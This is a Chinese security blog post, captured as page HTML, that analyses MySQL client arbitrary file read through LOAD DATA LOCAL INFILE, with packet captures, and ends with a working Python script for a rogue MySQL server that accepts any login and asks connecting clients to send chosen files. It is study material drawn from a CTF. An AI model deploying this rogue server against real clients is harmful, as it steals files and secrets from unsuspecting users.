@@ -1,0 +1,1614 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="https://fonts.css.network//css?family=Microsoft YaHei:300,300italic,400,400italic,700,700italic|STLiti:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|STLiti:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/米兔.jpg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="关于Mysql客户端任意文件读取的分析利用实践，其中包括对mysql读取客户端文件过程的抓包分析、利用python脚本伪造mysql服务器读取客户端文件">
+<meta name="keywords" content="Web安全,Mysql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql客户端任意文件读取">
+<meta property="og:url" content="http://miracle778.github.io/Web安全/Mysql/Mysql客户端任意文件读取.html">
+<meta property="og:site_name" content="Miracle778&#39;s Blog">
+<meta property="og:description" content="关于Mysql客户端任意文件读取的分析利用实践，其中包括对mysql读取客户端文件过程的抓包分析、利用python脚本伪造mysql服务器读取客户端文件">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//6.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//7.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//8.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//9.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//10.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//11.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//12.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//13.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//14.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//15.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//16.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//1.png">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//17.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//21.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//20.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//23.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//19.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//18.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//24.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//25.JPG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//26.JPG">
+<meta property="og:updated_time" content="2019-04-28T15:30:56.020Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql客户端任意文件读取">
+<meta name="twitter:description" content="关于Mysql客户端任意文件读取的分析利用实践，其中包括对mysql读取客户端文件过程的抓包分析、利用python脚本伪造mysql服务器读取客户端文件">
+<meta name="twitter:image" content="http://miracle778.github.io/Web安全/Mysql//Mysql客户端任意文件读取//1.JPG">
+
+
+
+
+
+
+  <link rel="canonical" href="http://miracle778.github.io/Web安全/Mysql/Mysql客户端任意文件读取.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Mysql客户端任意文件读取 | Miracle778's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Miracle778's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人生本来就有很多事是徒劳无功呀!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://miracle778.github.io/Web安全/Mysql/Mysql客户端任意文件读取.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Miracle778">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/米兔.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Miracle778's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Mysql客户端任意文件读取
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-28 18:43:29 / 修改时间：23:30:56" itemprop="dateCreated datePublished" datetime="2019-04-28T18:43:29+08:00">2019-04-28</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/Mysql/" itemprop="url" rel="index"><span itemprop="name">Mysql</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/Web安全/Mysql/Mysql客户端任意文件读取.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/Web安全/Mysql/Mysql客户端任意文件读取.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">7.1k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">6 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p style="text-indent:27px;">关于Mysql客户端任意文件读取的分析利用实践，其中包括对mysql读取客户端文件过程的抓包分析、利用python脚本伪造mysql服务器读取客户端文件</p>
+
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前做DDCTF 2019 Web题的时候，有一题Mysql弱口令的题用到了这个点，故来学习记录一波。</p>
+<h1 id="Load-Data-infile"><a href="#Load-Data-infile" class="headerlink" title="Load Data infile"></a>Load Data infile</h1><p>在Mysql的官方文档中，有一项Security Issues with Load Data local（下图），里面提到了两个Load Data local的潜在安全问题，也就是我今天要分析学习的。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\1.JPG" alt></p>
+<p>英语好的就看官方文档<a href="https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html" target="_blank" rel="noopener">Security Issues with Load Data Local</a>吧。</p>
+<p>不想看英文的就来看我结合大佬blog得出的总结吧。简单来讲，就是我们可以利用python或者其他语言伪造一个mysql服务器(监听3306端口)，这个伪造的mysql服务器可以不实现mysql任何功能（除了向客户端回复 greeting package外），当有别的客户端连接上该服务器时，就可以读取该客户端上的任意文件，前提是客户端具有该文件读写权限。</p>
+<p>load data infile语法分析<br>mysql的loda data infile语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> TestTable <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'分隔符'</span>;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> TestTable <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'分隔符'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>上面两条语句的区别就是，load data infile是将服务器上的文件(此处指/etc/passwd)插入表中，load data local infile是将客户端的文件插入表中</p>
+<p>下面看我的本机执行结果图：</p>
+<ol>
+<li>新建一个表test，结构如图示<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\2.JPG" alt></li>
+<li>使用local data infile语句，这里1.txt文件内容为<code>Miracle778:test</code>,可以看到插入成功<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\3.JPG" alt></li>
+<li>使用local data local infile语句，这里因为我连的是本机127.0.0.1的mysql，所以客户端服务器是同一台主机。可以看到，语句执行成功<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\4.JPG" alt></li>
+</ol>
+<p>好像扯多了，下面进入正题吧——如何伪造一个mysql服务端呢？</p>
+<h1 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>要构造一个mysql服务器，那肯定要知道mysql服务器和客户端是怎么通信的。所以我们利用win 10主机上的mysql(5.5.40)做服务端，然后用kali虚拟机做客户端进行连接，过程中开启wireshark抓包。</p>
+<h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><ol>
+<li><p>先在客户端kali上新建一个test文件等下用来load data local infile，内容为<code>kali-client:Miracle778</code>，同时把test表的列长度改一下(之前测试时建小了233)<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\6.JPG" alt></p>
+</li>
+<li><p>打开wireshark，准备监听3306端口<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\7.JPG" alt></p>
+</li>
+<li><p>用kali进行mysql连接，并使用load data local infile语句将文件插入test表里，这里用mysql连接时，注意加上<code>--enable-local-infile</code>选项，否则操作可能不生效。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\8.JPG" alt><br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\9.JPG" alt></p>
+</li>
+<li><p>可以看到wireshark中抓到一系列包<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\10.JPG" alt></p>
+</li>
+</ol>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>我们来具体分析分析刚刚所抓到的包。<br>简单来看，一共有这么几步</p>
+<ol>
+<li>greeting包，获取服务端的banner<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\11.JPG" alt></li>
+<li>登录请求包<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\12.jpg" alt></li>
+<li>初始化的一些查询，比如select @@version_comment limit 1、show databases、use database之类的<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\13.JPG" alt></li>
+</ol>
+<p>下面让我们来找到关于执行 load data local infile语句的包。<br>第一个包是客户端发起的Request Query，看起来挺正常的。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\14.jpg" alt><br>但紧接着，服务端发回一个包含刚刚请求中文件名的包，这里是把<code>/root/桌面/test.txt</code>发回去了<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\15.jpg" alt><br>然后客户端才开始发送<code>/root/桌面/test.txt</code>文件的内容<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\16.jpg" alt></p>
+<p>对上面过程做个简单梳理，可以得到</p>
+<blockquote>
+<p>如果客户端要用load data local infile 将文件插入表中的话，客户端会先发一个请求包，这个请求包里包含了要插入的文件的路径。而服务器接下来返回一个Response TABULAR包，里面包含文件路径（我猜意思大概是我服务器允许你客户端上传xx文件)，然后客户端得到了许可才开始传输文件。</p>
+</blockquote>
+<p>这就引发思考了，如果服务器返回的Response TABULAR包里的文件路径不是客户端发出的请求包的路径的话，客户端会不会上传服务器指定的文件? 换而言之，如果通过控制服务器，在其返回的Response TABULAR包里更改文件路径，能否实现客户端任意文件读取。答案是肯定的(<del>不然我就不会在这研究分析了，2333</del>)<br>正如官方文档中提出的安全风险，<code>In theory, a patched server could be built that would tell the client program to transfer a file of the server&#39;s choosing rather than the file named by the client in the LOAD DATA statement.</code>，可以看到，客户端读取哪个文件其实并不是自己说了算的。这里借用一下大佬博客里的举例<br>正常情况:</p>
+<blockquote>
+<p>客户端：hi~ 我把我的test.txt文件插到你的test表中可以么<br>服务端: OK,读取你本地的test.txt文件发给我<br>客户端: 这是文件内容：富强、民主、和谐</p>
+</blockquote>
+<p>被恶意服务器篡改的情况：</p>
+<blockquote>
+<p>客户端：hi~ 我把我的test.txt文件插到你的test表中可以么<br>服务端：OK,读取你本地的user.txt文件发给我<br>客户端: 这是文件内容: Miracle778 173xxxx1416</p>
+</blockquote>
+<p>到这里有人可能要问，即便可以读任意文件，那也要等到客户端发起 LOAD DATA LOCAL INFILE后才能篡改回复要读取的文件路径呀。这里官方文档中也讲到了:<code>&quot;A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL</code>这句话意思是说伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在LOAD DATA LOCAL的时候。但如果想要利用此特性，客户端必须具有 CLIENT_LOCAL_FILES 属性即可以使用load data local infile，这也是为什么在前面kali连接mysql时需要添加–enable-local-infile的原因。</p>
+<h1 id="伪造mysql服务端"><a href="#伪造mysql服务端" class="headerlink" title="伪造mysql服务端"></a>伪造mysql服务端</h1><h2 id="理论分析"><a href="#理论分析" class="headerlink" title="理论分析"></a>理论分析</h2><p>由前面分析可知，如果想要达到读取客户端任意文件目的的话，伪造的mysql服务端必须能够发送下列几个包。</p>
+<ol>
+<li>向mysql client发送Server greeting包</li>
+<li>对mysql client的登录包做Accept all authentications响应(即任意用户密码都能登录)</li>
+<li>等待 Client 端发送一个Query Package</li>
+<li>回复一个file transfer请求</li>
+</ol>
+<p>那现在要解决的就是server greeting、auth、file transfer包的格式，方便编程构造<br>。server greeting和file transfer的包结构都可以在官方文档中找到</p>
+<p><code>File Transfer</code>数据包格式:<a href="https://dev.mysql.com/doc/internals/en/com-query-response.html" target="_blank" rel="noopener">Protocol::LOCAL_INFILE_Request</a><br>官方文档里还附带一张图,由这张图可以发现，我们需要等待一个来自 Client 的查询请求，才能回复这个读文件的请求<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\1.png" alt></p>
+<p>官方文档还给了一个example<br><code>0c 00 00 01 fb 2f 65 74    63 2f 70 61 73 73 77 64    ...../etc/passwd</code><br>这里前4个字节 0c 00 00 01中 0x0c表示数据包长度，从0xfb后开始算，长度后面的三个字节00 00 01表示数据包的序号。数据包的内容是从第五个字节 0xfb后开始的，0xfb代表包的类型，0xfb后面的就是数据内容了，这里是/etc/passwd</p>
+<p>之前抓的file transfer包的格式截图如下，与上面example分析一致<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\17.jpg" alt></p>
+<p><a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake" target="_blank" rel="noopener">Greeting包官方文档</a>,如果不会构造可以直接拷贝抓到的数据包然后改一下长度、文件名之类的。<br>这里copy下大佬的格式总结<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&apos;\x0a&apos;,  # Protocol</span><br><span class="line">&apos;6.6.6-lightless_Mysql_Server&apos; + &apos;\0&apos;,  # Version</span><br><span class="line">&apos;\x36\x00\x00\x00&apos;,  # Thread ID</span><br><span class="line">&apos;ABCDABCD&apos; + &apos;\0&apos;,  # Salt</span><br><span class="line">&apos;\xff\xf7&apos;,  # Capabilities, CLOSE SSL HERE!</span><br><span class="line">&apos;\x08&apos;,  # Collation</span><br><span class="line">&apos;\x02\x00&apos;,  # Server Status</span><br><span class="line">&quot;\x0f\x80\x15&quot;, </span><br><span class="line">&apos;\0&apos; * 10,  # Unknown</span><br><span class="line">&apos;ABCDABCD&apos; + &apos;\0&apos;,</span><br><span class="line">&quot;mysql_native_password&quot; + &quot;\0&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h2><p>这里参考一个国外大佬的简单脚本，可以根据自己抓包的情况简单改改，只要改第10行的端口(非必须),15行greeting、20行的payloadlen、22行的payload。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># linux :</span></span><br><span class="line">filestring = <span class="string">"/root/桌面/test.txt"</span>  <span class="comment">#这一行并没有什么卵用，估计是记录一下读的哪个文件</span></span><br><span class="line"><span class="comment"># windows:</span></span><br><span class="line"><span class="comment">#filestring = "C:\\Windows\\system32\\drivers\\etc\\hosts"</span></span><br><span class="line">HOST = <span class="string">"0.0.0.0"</span> <span class="comment"># open for eeeeveryone! ^_^</span></span><br><span class="line">PORT = <span class="number">3307</span>     <span class="comment"># 改下端口</span></span><br><span class="line">BUFFER_SIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原作者的greeting = "\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span></span><br><span class="line"><span class="comment">#1 Greeting</span></span><br><span class="line">greeting = <span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x34\x30\x00\x13\x00\x00\x00\x51\x59\x4a\x48\x67\x51\x3f\x29\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4c\x23\x69\x6a\x56\x50\x6f\x5c\x5e\x45\x7c\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span></span><br><span class="line"><span class="comment">#2 Accept all authentications</span></span><br><span class="line">authok = <span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3 Payload</span></span><br><span class="line">payloadlen = <span class="string">"\x16"</span>  <span class="comment">#原payloadlen = "\x0b"</span></span><br><span class="line">padding = <span class="string">"\x00\x00"</span></span><br><span class="line">payload = payloadlen + padding +  <span class="string">"\x01\xfb\x2f\x72\x6f\x6f\x74\x2f\xe6\xa1\x8c\xe9\x9d\xa2\x2f\x74\x65\x73\x74\x2e\x74\x78\x74"</span> </span><br><span class="line"><span class="comment">#原payload = payloadlen + padding +  "\x0b\x00\x00\x01\xfb\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73"</span></span><br><span class="line"><span class="comment">#/etc/hosts</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Connection from:'</span>, addr</span><br><span class="line">    conn.send(greeting)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">" "</span>.join(<span class="string">"%02x"</span> % ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> data)</span><br><span class="line">        conn.send(authok)</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Payload send!"</span></span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Data received:"</span>, data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># Don't leave the connection open.</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></p>
